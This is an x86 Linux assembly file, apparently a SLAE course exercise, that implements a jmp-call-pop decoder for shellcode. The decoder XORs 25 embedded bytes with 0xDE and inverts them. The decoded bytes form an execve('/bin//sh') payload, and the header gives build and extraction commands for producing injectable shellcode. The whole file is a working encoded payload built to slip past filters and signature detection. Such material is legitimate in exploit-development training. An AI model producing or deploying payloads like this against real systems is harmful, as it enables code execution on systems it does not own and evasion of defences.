; Executable name       : decoder
; Designed OS           : Linux (32-bit)
; Author                : wetw0rk
; Version               : 1.0
; Created Following     : SLAE
; Description           : Encoded shellcode from my custom encoder
;
; Build using the folowing commands:
;	make
;	python objdump2shellcode.py -d decoder -f c -b "\x00"
;

SECTION .text

global _start

_start:
	jmp call_decoder

decoder:
	pop ebx
	pop eax
	xor ecx,ecx
	mov cl,25
	xor edx,edx

decode:
	xor byte [ebx+edx],0xDE
	not byte [ebx+edx]
	inc edx
	loop decode
	jmp short shellcode

call_decoder:
	call decoder

shellcode:
	db 0x10,0xe1,0x71,0x49,0x0e,0x0e,0x52,0x49
	db 0x49,0x0e,0x43,0x48,0x4f,0xa8,0xc2,0x71
	db 0xa8,0xc3,0x72,0xa8,0xc0,0x91,0x2a,0xec
	db 0xa1

